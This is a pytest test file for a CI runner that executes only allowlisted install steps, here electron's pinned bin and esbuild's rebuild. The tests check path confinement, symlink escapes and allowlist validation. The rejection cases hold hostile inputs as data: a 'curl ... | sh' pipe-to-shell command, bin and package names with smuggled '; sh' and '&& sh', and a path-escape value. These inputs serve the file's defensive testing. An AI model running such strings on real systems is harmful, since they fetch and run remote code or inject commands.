"""#1819: `tools/ci/run-allowed-postinstall.mjs` is the one SR-138 path for install steps under
`--ignore-scripts` installs. Electron 42 and later ship no postinstall, so the allowlist pins
electron's own `install-electron` bin, which the runner executes with node and no shell, while an
entry without `run` (esbuild) keeps `pnpm rebuild`. The runner reads a pinned package only from
`<from>/node_modules/<name>` (its link resolved: no walk up the tree, no NODE_PATH), and checks
every entry and finds every pinned bin before anything runs: a field it does not run, a bin name
that is not bare, a bin outside the package (by path or through a link) or one the installed
package no longer ships fails the run.

The runner cases copy the real runner into a scratch repository, so the scratch one is its repo
root, and put a stand-in `pnpm` that records its arguments first on PATH. CI must run them: without
node they fail there, and skip only on a developer machine."""

from __future__ import annotations

import json
import os
import shutil
import subprocess
from pathlib import Path
from typing import Any

import pytest

ROOT = Path(__file__).resolve().parents[2]
RUNNER = ROOT / "tools" / "ci" / "run-allowed-postinstall.mjs"
ALLOWLIST = ROOT / "tools" / "ci" / "allowed-postinstall.json"

needs_posix = pytest.mark.skipif(os.name == "nt", reason="the stand-in pnpm is a shell script")

ELECTRON: dict[str, Any] = {
    "name": "electron",
    "run": {"bin": "install-electron", "from": "apps/desktop"},
    "reason": "fixture",
    "reviewedBy": "fixture",
}
ESBUILD: dict[str, Any] = {"name": "esbuild", "reason": "fixture", "reviewedBy": "fixture"}
#: The file a fixture stub writes beside itself (its working directory in it), so a case can tell
#: that it ran.
MARKER = "fetched.txt"
STUB = (
    "require('node:fs').writeFileSync("
    f"require('node:path').join(__dirname, '{MARKER}'), process.cwd());\n"
)


def _need_node() -> None:
    if shutil.which("node") is None:  # CI must run these fail-closed proofs
        (pytest.fail if os.environ.get("CI") else pytest.skip)("node runs the postinstall runner")


def _repo(
    tmp_path: Path,
    entries: list[Any],
    bins: dict[str, str] | None = None,
    *,
    stub: str | None = "install.js",
    stub_link: Path | None = None,
    installed_in: str | None = "apps/desktop",
    manifest_extra: dict[str, Any] | None = None,
    allowlist_text: str | None = None,
) -> Path:
    """The real runner in a scratch repository, with an allowlist and an installed electron whose
    `stub` file writes the marker (or links to `stub_link`)."""
    root = tmp_path / "repo"
    ci = root / "tools" / "ci"
    ci.mkdir(parents=True)
    shutil.copy(RUNNER, ci / RUNNER.name)
    text = json.dumps({"packages": entries}) if allowlist_text is None else allowlist_text
    (ci / ALLOWLIST.name).write_text(text, encoding="utf-8")
    desktop = root / "apps" / "desktop"
    desktop.mkdir(parents=True)
    (desktop / "package.json").write_text('{"name": "desktop", "private": true}', encoding="utf-8")
    if installed_in is not None:
        package = root / installed_in / "node_modules" / "electron"
        package.mkdir(parents=True)
        bin_map = {"electron": "cli.js", "install-electron": "install.js"} if bins is None else bins
        manifest = {"name": "electron", "version": "45.0.0", "bin": bin_map}
        manifest.update(manifest_extra or {})
        (package / "package.json").write_text(json.dumps(manifest), encoding="utf-8")
        if stub_link is not None:
            (package / str(stub)).symlink_to(stub_link)
        elif stub is not None:
            (package / stub).write_text(STUB, encoding="utf-8")
    return root


def _run(
    root: Path, tmp_path: Path, extra_env: dict[str, str] | None = None
) -> tuple[subprocess.CompletedProcess[str], list[str]]:
    """Runs the scratch repository's runner; returns its result and the stand-in pnpm's calls."""
    _need_node()
    stand_in = tmp_path / "bin"
    stand_in.mkdir()
    calls = tmp_path / "pnpm-calls.txt"
    pnpm = stand_in / "pnpm"
    pnpm.write_text(f"#!/bin/sh\necho \"$@\" >> '{calls}'\n", encoding="utf-8")
    pnpm.chmod(0o755)
    env = {**os.environ, "PATH": f"{stand_in}{os.pathsep}{os.environ.get('PATH', '')}"}
    env.update(extra_env or {})
    proc = subprocess.run(
        ["node", str(root / "tools" / "ci" / RUNNER.name)],
        env=env,
        capture_output=True,
        text=True,
        check=False,
    )
    return proc, calls.read_text(encoding="utf-8").splitlines() if calls.exists() else []


def _marker(root: Path, installed_in: str = "apps/desktop") -> Path:
    return root / installed_in / "node_modules" / "electron" / MARKER


@needs_posix
def test_runner_rebuilds_esbuild_and_runs_electrons_pinned_bin_in_its_package(
    tmp_path: Path,
) -> None:
    root = _repo(tmp_path, [ELECTRON, ESBUILD])
    proc, calls = _run(root, tmp_path)
    assert proc.returncode == 0, proc.stderr
    # esbuild's handling is unchanged; electron is no longer handed to `pnpm rebuild`.
    assert calls == ["rebuild esbuild"]
    package = root / "apps" / "desktop" / "node_modules" / "electron"
    assert _marker(root).read_text(encoding="utf-8") == str(package.resolve())
    assert "running electron@45.0.0's install-electron bin" in proc.stdout
    assert "electron@45.0.0's install-electron bin done in " in proc.stdout


@needs_posix
def test_runner_runs_a_pinned_bin_whose_file_name_has_a_space_without_a_shell(
    tmp_path: Path,
) -> None:
    # A shell would split the path at the space and run a file that does not exist.
    bins = {"electron": "cli.js", "install-electron": "install electron.js"}
    root = _repo(tmp_path, [ELECTRON, ESBUILD], bins, stub="install electron.js")
    proc, _ = _run(root, tmp_path)
    assert proc.returncode == 0, proc.stderr
    assert _marker(root).is_file()


@needs_posix
def test_runner_reads_the_package_json_whatever_its_exports_map_says(tmp_path: Path) -> None:
    # The manifest is read from its path, so an `exports` map that hides it changes nothing.
    exports = {"exports": {".": "./index.js"}}
    root = _repo(tmp_path, [ELECTRON, ESBUILD], manifest_extra=exports)
    proc, _ = _run(root, tmp_path)
    assert proc.returncode == 0, proc.stderr
    assert _marker(root).is_file()


@needs_posix
def test_runner_runs_nothing_that_is_not_on_the_allowlist(tmp_path: Path) -> None:
    # electron is installed with its install-electron bin, but the allowlist does not name it.
    root = _repo(tmp_path, [ESBUILD])
    proc, calls = _run(root, tmp_path)
    assert proc.returncode == 0, proc.stderr
    assert calls == ["rebuild esbuild"]
    assert not _marker(root).exists()


@needs_posix
@pytest.mark.parametrize(
    ("bins", "stub", "installed", "said"),
    [
        (
            {"electron": "cli.js"},
            "install.js",
            True,
            'no "install-electron" in its package.json bin',
        ),
        (None, None, True, "names install.js, which the package lacks"),
        ({"install-electron": "../../../../outside.js"}, None, True, "points outside the package"),
        (None, "install.js", False, "electron is not installed for apps/desktop"),
    ],
    ids=["bin-moved", "bin-file-missing", "bin-outside-package", "not-installed"],
)
def test_runner_fails_loudly_and_runs_nothing_when_the_pinned_bin_is_unusable(
    tmp_path: Path, bins: dict[str, str] | None, stub: str | None, installed: bool, said: str
) -> None:
    where = "apps/desktop" if installed else None
    root = _repo(tmp_path, [ELECTRON, ESBUILD], bins, stub=stub, installed_in=where)
    proc, calls = _run(root, tmp_path)
    assert proc.returncode == 1
    assert said in proc.stderr
    # Checked before anything ran: not even esbuild's rebuild.
    assert calls == []
    assert not _marker(root).exists()


@needs_posix
def test_runner_refuses_a_bin_that_links_outside_the_package(tmp_path: Path) -> None:
    outside = tmp_path / "outside.js"
    outside.write_text(STUB, encoding="utf-8")
    root = _repo(tmp_path, [ELECTRON, ESBUILD], stub="install.js", stub_link=outside)
    proc, calls = _run(root, tmp_path)
    assert proc.returncode == 1
    assert "points outside the package through a link" in proc.stderr
    assert calls == []
    assert not (tmp_path / MARKER).exists()


@needs_posix
def test_runner_reads_the_package_only_from_the_workspaces_own_node_modules(
    tmp_path: Path,
) -> None:
    # electron sits where Node's resolution would find it (a node_modules up the tree, and
    # NODE_PATH), but not in apps/desktop/node_modules: the runner refuses it.
    root = _repo(tmp_path, [ELECTRON, ESBUILD], installed_in="")
    proc, calls = _run(root, tmp_path, {"NODE_PATH": str(root / "node_modules")})
    assert proc.returncode == 1
    missing = "apps/desktop/node_modules/electron/package.json is missing"
    assert f"electron is not installed for apps/desktop ({missing})" in proc.stderr
    assert calls == []
    assert not _marker(root, "").exists()


@needs_posix
def test_runner_refuses_a_from_that_names_no_workspace(tmp_path: Path) -> None:
    entries = [{**ELECTRON, "run": {"bin": "install-electron", "from": "apps/missing"}}, ESBUILD]
    root = _repo(tmp_path, entries)
    proc, calls = _run(root, tmp_path)
    assert proc.returncode == 1
    assert "electron: run.from names no workspace (apps/missing/package.json is missing)" in (
        proc.stderr
    )
    assert calls == []
    assert not _marker(root).exists()


@needs_posix
@pytest.mark.parametrize(
    ("entries", "said"),
    [
        (
            [{**ESBUILD, "command": "curl https://example.invalid/x.sh | sh"}],
            "fields the runner does not run: command",
        ),
        (
            [{**ELECTRON, "run": {"bin": "install-electron; sh", "from": "apps/desktop"}}, ESBUILD],
            "run.bin must be a bare bin name",
        ),
        (
            [{**ELECTRON, "run": {"bin": "install-electron", "from": "apps/../.."}}, ESBUILD],
            "run.from must be a workspace path",
        ),
        (
            [{**ELECTRON, "run": {**ELECTRON["run"], "args": ["--force"]}}, ESBUILD],
            "run must have exactly bin and from, found: args, bin, from",
        ),
        ([{**ELECTRON, "run": {}}, ESBUILD], "run must have exactly bin and from, found: none"),
        ([{**ESBUILD, "name": "esbuild && sh"}], "has no valid package name"),
        ([ESBUILD, ESBUILD], "esbuild is listed twice"),
    ],
    ids=[
        "free-form-command",
        "shell-syntax-bin",
        "path-escape",
        "extra-run-field",
        "empty-run",
        "name",
        "twice",
    ],
)
def test_runner_refuses_an_entry_outside_the_reviewed_shape(
    tmp_path: Path, entries: list[Any], said: str
) -> None:
    root = _repo(tmp_path, entries)
    proc, calls = _run(root, tmp_path)
    assert proc.returncode == 1
    assert said in proc.stderr
    assert calls == []
    assert not _marker(root).exists()


@needs_posix
@pytest.mark.parametrize(
    ("text", "said"),
    [
        ("null", "is missing a packages[] array"),
        ('{"packages": {}}', "is missing a packages[] array"),
        ('{"packages": [', "cannot be read as JSON"),
    ],
    ids=["null", "packages-not-a-list", "not-json"],
)
def test_runner_names_the_allowlist_it_cannot_read(tmp_path: Path, text: str, said: str) -> None:
    root = _repo(tmp_path, [], allowlist_text=text)
    proc, calls = _run(root, tmp_path)
    assert proc.returncode == 1
    assert f"tools/ci/allowed-postinstall.json: {said}" in proc.stderr
    assert calls == []


def test_repo_allowlist_pins_electrons_install_bin_and_keeps_esbuild_on_rebuild() -> None:
    entries = {e["name"]: e for e in json.loads(ALLOWLIST.read_text(encoding="utf-8"))["packages"]}
    assert entries["electron"]["run"] == {"bin": "install-electron", "from": "apps/desktop"}
    assert "run" not in entries["esbuild"]
    for name, entry in entries.items():
        assert entry["reason"] and entry["reviewedBy"], name


def test_repo_runner_accepts_the_repo_allowlist() -> None:
    _need_node()
    js = (
        f"const m = await import({json.dumps(RUNNER.as_uri())});"
        f" console.log(JSON.stringify(m.loadEntries({json.dumps(str(ROOT))})));"
    )
    out = subprocess.run(
        ["node", "--input-type=module", "-e", js], capture_output=True, text=True, check=True
    )
    entries = json.loads(out.stdout.strip().splitlines()[-1])
    assert {"name": "electron", "run": ELECTRON["run"]} in entries
    assert {"name": "esbuild"} in entries
